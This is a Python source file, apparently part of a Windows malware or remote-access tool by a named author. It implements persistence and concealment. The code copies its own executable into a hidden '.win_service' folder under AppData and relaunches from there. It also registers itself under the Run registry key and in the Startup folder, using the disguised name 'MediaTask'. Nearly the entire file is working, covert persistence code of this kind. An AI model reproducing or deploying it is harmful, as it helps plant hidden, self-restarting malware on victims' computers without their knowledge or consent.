##  _________________________________________
##   |_______  authors: Eks1azy  _______| 
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\                    
##  ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy   / /
##  |                                        / / 
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/


import os
import shutil
import sys
from pathlib import Path
import subprocess
import winreg

def extract_file(resource_name, output_path):
    if not os.path.exists(output_path):
        current_dir = Path(__file__).resolve().parent
        resource_path = current_dir / resource_name

        if resource_path.exists():
            shutil.copy(resource_path, output_path)
        else:
            raise FileNotFoundError(f'Resource {resource_path} not found')


def copy_and_rename(destination_folder, new_name, icon_path=None):
    new_file_path = os.path.join(destination_folder, new_name)

    if os.path.exists(new_file_path):
        return "Файл уже существует. Копирование не требуется."

    current_file = sys.argv[0]

    try:
        shutil.copy(current_file, new_file_path)

        return f"Файл успешно скопирован в {new_file_path}"
    except Exception as e:
        return f"Ошибка при копировании: {e}"
    

########### UNCOMMIT WHEN YOU WILL BUILD EXE ###########

def copy_and_run():
    current_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    appdata = os.getenv('APPDATA')
    hidden_folder = os.path.join(appdata, '.win_service')
    if not os.path.exists(hidden_folder):
        os.makedirs(hidden_folder)
        os.system(f'attrib +h "{hidden_folder}"')  
    dest_path = os.path.join(hidden_folder, os.path.basename(current_path))

    if current_path != dest_path:
        try:
            shutil.copy2(current_path, dest_path)
            subprocess.Popen([dest_path], shell=False)
            sys.exit()
        except Exception as e:
            print(f"[!] ERROR: {e}")
            sys.exit(1)


def add_to_registry(script_path):
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
                                 winreg.KEY_SET_VALUE)

        winreg.SetValueEx(reg_key, "MediaTask", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(reg_key)

        return True
    except Exception:
        return False


def add_to_startup_folder(script_path):
    try:
        startup_folder = os.path.expandvars(
            r"%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
        )

        shortcut_name = "MediaTask.lnk"
        shortcut_path = os.path.join(startup_folder, shortcut_name)

        if os.path.exists(shortcut_path):
            return

        ps_command = (
            f"$s = (New-Object -COM WScript.Shell).CreateShortcut('{shortcut_path}'); "
            f"$s.TargetPath = '{script_path}'; "
            f"$s.WorkingDirectory = '{os.path.dirname(script_path)}'; "
            f"$s.Save()"
        )

        subprocess.run(["powershell", "-Command", ps_command], capture_output=True, text=True)
    except Exception:
        pass